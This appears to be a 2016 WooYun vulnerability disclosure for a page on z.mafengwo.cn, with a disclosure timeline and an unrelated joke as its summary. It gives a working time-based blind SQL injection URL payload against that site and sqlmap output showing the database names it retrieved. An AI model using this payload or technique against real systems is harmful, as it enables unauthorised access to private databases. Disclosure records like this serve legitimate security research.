wybug_detail:
漏洞详情 披露状态：   									2016-03-26：	细节已通知厂商并且等待厂商处理中									2016-03-26：	厂商已经确认，细节仅向厂商公开									2016-04-05：	细节向核心白帽子及相关领域专家公开									2016-04-15：	细节向普通白帽子公开									2016-04-25：	细节向实习白帽子公开									2016-05-10：	细节向公众公开  简要描述： 小明前两天去医院抽血，护士妹子看了半天小明右臂，愣了找不到血管，然后就说：大哥，平时不怎么运动吧？结果小明果断换成了左臂，护士妹子看了说：哟呵，原来大哥喜欢用左手呀 详细说明：  http://z.mafengwo.cn/lvyou/57178.htmlpoc  http://z.mafengwo.cn:80/lvyou/57178) AND (SELECT * FROM (SELECT(SLEEP(5)))PVdT) AND (2410=2410.html

   漏洞证明：  
Parameter: #1* (URI)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: http://z.mafengwo.cn:80/lvyou/57178) AND (SELECT * FROM (SELECT(SLEEP(5)))PVdT) AND (2410=2410.html---[09:56:59] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.12[09:56:59] [INFO] fetching database names[09:56:59] [INFO] fetching number of databases[09:56:59] [WARNING] time-based comparison requires larger statistical model, please wait..............................                                                              [09:57:12] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y[09:57:29] [INFO] adjusting time delay to 2 seconds due to good response times3[09:57:31] [INFO] retrieved: information_schema[10:01:01] [INFO] retrieved: mafengwo[10:02:39] [INFO] retrieved: testavailable databases [3]:[*] information_schema[*] mafengwo[*] test
